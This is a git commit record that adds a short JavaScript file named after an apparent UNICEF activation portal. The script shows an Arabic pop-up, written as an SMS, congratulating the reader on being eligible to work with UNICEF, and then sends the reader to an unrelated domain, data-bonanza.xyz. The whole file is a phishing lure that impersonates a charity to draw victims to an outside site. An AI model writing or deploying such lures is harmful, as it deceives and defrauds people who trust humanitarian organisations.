e763dbf7f23c35a6d283a21a572e3487132ad4b7
infofest <ukpono82@gmail.com>
2025-03-13 00:09:37 -0700

    Create activation-portal-unicef.org.js

---
+++ activation-portal-unicef.org.js
@@ -0,0 +1,7 @@
+
+
+var password = 'تقدم الآن'
+password=prompt('SMS: مبروك أنت مؤهل للعمل مع صندوق الأمم المتحدة للطفولة (اليونيسيف), يرجى الضغط على "تقديم الطلب الآن" لتقديم الطلب   ','تقدم الآن');
+if (password != 'تقدم الآن') {
+location.href='https://www.data-bonanza.xyz/portal-unicef.org';
+}
